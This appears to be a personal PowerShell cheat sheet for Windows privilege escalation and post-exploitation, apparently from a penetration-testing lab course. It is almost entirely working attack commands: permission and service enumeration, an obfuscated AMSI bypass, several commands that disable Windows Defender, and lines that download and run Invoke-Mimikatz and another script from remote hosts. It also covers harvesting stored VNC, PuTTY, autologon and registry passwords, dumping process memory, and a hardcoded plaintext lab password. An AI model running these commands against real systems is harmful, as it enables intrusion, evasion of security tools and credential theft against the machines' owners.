systeminfo  # OS, Architecture, and hostname
Get-ChildItem ENV: | ft Key,Value  # Any environmental variables cool?
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | ft Name,Root  # Connected drives?

# Users
$env:UserName
whoami /priv
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Use -Force | select Name

#groups
Get-LocalGroup | ft Name
Get-LocalGroupMember Administrators | ft name, principalSource

# Autologon?
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | select "Defaults"

# Credential Manager?
Get-ChildItem -Hidden ~\AppData\Local\Microsoft\Credentials
Get-ChildItem -Hidden ~\AppData\Roaming\Microsoft\Credentials

#installed Software
gci 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent, Name,LastWriteTime
gci -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

# Full permissions?
icacls 'C:\Program Files\*' 2>null | findstr "(F)" | findstr "Everyone"
icacls 'C:\Program Files (x86)\*' 2>null | findstr "(F)" | findstr "Everyone"
icacls 'C:\Program Files\*' 2>null | findstr "(F)" | findstr "BUILTIN\Users"
icacls 'C:\Program Files (x86)\*' 2>null | findstr "(F)" | findstr "BUILTIN\Users"

#Modify Permissions?
icacls 'C:\Program Files\*' 2>null | findstr "(M)" | findstr "Everyone"
icacls 'C:\Program Files (x86)\*' 2>null | findstr "(M)" | findstr "Everyone"
icacls 'C:\Program Files\*' 2>null | findstr "(M)" | findstr "BUILTIN\Users"
icacls 'C:\Program Files (x86)\*' 2>null | findstr "(M)" | findstr "BUILTIN\Users"

# Running Processes
Get-Process | where {$_.ProcessName -notlike "svchost"} | ft processname,id
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost"} | select Name,Handle,@{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

# Weak service permissions
gwmi -Class Win32_Service -Property Name, DisplayName, PathName,StartMode | where {$_.StartMode -eq "Auto" -and $_.pathname -notlike "C:\Windows*" -and $_.pathName -notlike '"*'} | select PathName,DisplayName,Name

#custom scheduled tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# Turn off defender
Set-MpPreference -DisableRealtimeMonitoring $true  # Must be admin

## Applocker go-around
# See what is there
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

### Getting around AMSI
# 
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE'  ) ) ;    (    GeT-VariaBle ("1q2u"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((   "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
# that only works for the session you are in
# other options for the AV are below. First list to see what is in effect
Invoke-Command -ScriptBlock{ Get-MpPreference } 
# Then just disable if you have the permissions
Invoke-Command -Session $sess -ScriptBlock { Set-ExecutionPolicy bypass; Set-MpPreference -DisableRealtimeMonitoring $true}
Invoke-Command -ScriptBlock{ Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{ Set-MpPreference -DisableRealtimeMonitoring $true} #-Session $sess
Set-ItemProperty -Path "Registry::HKLM\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
# Getting files around
iex (iwr http://192.168.49.150/Invoke-Mimikatz.ps1)
# check to see if it really got loaded in memory
help Invoke-Mimikatz
# if it still gets blocked, try downloading the AMSI bypass in a PS1 file and then repeat
IEX((New-Object Net.WebClient).DownloadString('http://<IP>/lovely.ps1'))

### Interesting Files Extraction
# TightVNC Password
$passwordTVNC = Get-ItemProperty HKLM:\SOFTWARE\TightVNC\Server | Select Password -ExpandProperty Password
$asHex = ($passwordTVNC | ForEach-Object ToString x2) -join ""
$asHex  # Now you have the hash to crack
vncpwd.exe $asHex
# Find files that may have passwords
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" #Autologin
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s #Check the values saved in each session, user/password could be there
reg query "HKCU\Software\OpenSSH\Agent\Key"
# Search for passwords inside all the registry. Takes a while, so don't do it unless you are just desperate..the registry is huge
reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
reg query HKLM /f sqlreportuser /t REG_SZ /s #Look for registries that contains "password"
# what security packages are loaded?
 Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
# find a process that is running you want to dump?
Get-Process
Out-MiniDump -Process (Get-Process -Id XXXX)
# If you have FlaUI version 3 available on the box, you can use FlaUI to see running process text
# after you dump, you can use select-string or strings.exe to parse through and review
# Now pull out any web credentials
Get-WEbCredentials
# The FileZilla flag is in the AppData directory of one of them, let's enumerate
Invoke-Command -Session $sess -ScriptBlock { gci C:\Users\dbadmin\AppData\Roaming\FileZilla }

## File search tricks
Invoke-Command -Session $sess -scriptblock { $findDate = Get-Date -Year 2019 -Month 10 -Day 30}
Invoke-Command -Session $sess -scriptblock { gci -Path C:\ -Include *.ps1 -File -Recurse -Erroraction 'silentlycontinue' -Force | where-object{ $_.LastWriteTime -ge $FindDate} }

## Example credential Commands
# Setting up username/password
$user = "USFUN\pastudent149"; $pass = ConvertTo-SecureString -String "vEaXa3xHGZrUgkYb" -AsPlainText -Force; $cred149 = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $pass
$sessTo149 = New-PSSession -Credential $cred -ComputerName "PA-User149"
# using that to copy between sessions. There is also a -ToSession flag
Copy-Item C:\Users\pastudent149\Documents\Invoke-Mimikatz.ps1 -Destination .\Invoke-Mimikatz.ps1 -FromSession $sessTo149


## Does this guy have database connections?
Invoke-SQLDumpInfo -Verbose -Instance <ComputerName>
gc *links.csv